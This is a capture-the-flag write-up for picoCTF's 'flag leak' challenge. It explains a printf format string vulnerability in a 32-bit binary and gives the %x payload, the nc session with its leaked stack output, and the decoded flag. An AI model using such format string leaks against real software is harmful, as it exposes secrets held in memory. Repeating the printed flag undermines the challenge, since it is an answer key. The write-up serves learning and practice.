# FLAG LEAK

# OVERVIEW & IDEA

- This challenge gives us a 32-bit binary file and its source code. Below is informations of binary file.

```
λ ~/flag_leak/ file vuln

vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=7cdf03860c5c78d6e375e91d88a2b05b28389fd0, for GNU/Linux 3.2.0, not stripped

λ ~/flag_leak/ checksec --file=vuln

[*] '~/flag_leak/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

- Look at the `vuln()` function, we can see that, it reads the flag and puts it in `flag[BUFSIZE]`, then, program takes input and puts it in `story[128]`. But at the end of function, we see a format string vulnerable `printf(story)`.

```c
void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}
```

- The idea of this challenge is just use format string vuln to leak the data on the stack, which contain flag.

## DETAILS & EXPLOIT

- I will use a bunch of `%x` to leak the data on stack. The index will be start at somewhere at `128/4 + 1 = 33` to `128/4 + 1 + 15 = 48`. `flag[]` will be at that range.

- I create the format string with simple script

```
>>> for i in range(33, 48):
...     print('%' + str(i) + '$08x', sep ='', end ='.')
...
%33$08x.%34$08x.%35$08x.%36$08x.%37$08x.%38$08x.%39$08x.%40$08x.%41$08x.%42$08x.%43$08x.%44$08x.%45$08x.%46$08x.%47$08x
```

- Copy that and feed as input for server and we get

```
λ ~/ nc saturn.picoctf.net 52344
Tell me a story and then I'll tell you one >> %33$08x.%34$08x.%35$08x.%36$08x.%37$08x.%38$08x.%39$08x.%40$08x.%41$08x.%42$08x.%43$08x.%44$08x.%45$08x.%46$08x.%47$08x.%48$08x
Here's a story -
2e783830.24383425.00783830.6f636970.7b465443.6b34334c.5f676e31.67346c46.6666305f.3474535f.635f6b63.34396532.7d643365.fbad2000.c7fa4100.00000000
```

- Using online hext to text converter I get this

![img](/picoCTF/flag_leak/assets/leak.png)

```
ocip{FTCk43L_gn1g4lFff0_4tS_c_kc49e2}d3e
```

- The order of flag is at little-endian so I write this script to convert to correct flag.

```
>>> s = "ocip{FTCk43L_gn1g4lFff0_4tS_c_kc49e2}d3e"
>>> for i in range(0, len(s), 4):
...     print(s[i+3], s[i+2], s[i+1], s[i], end = '', sep = '')
...
picoCTF{L34k1ng_Fl4g_0ff_St4ck_c2e94e3d}
```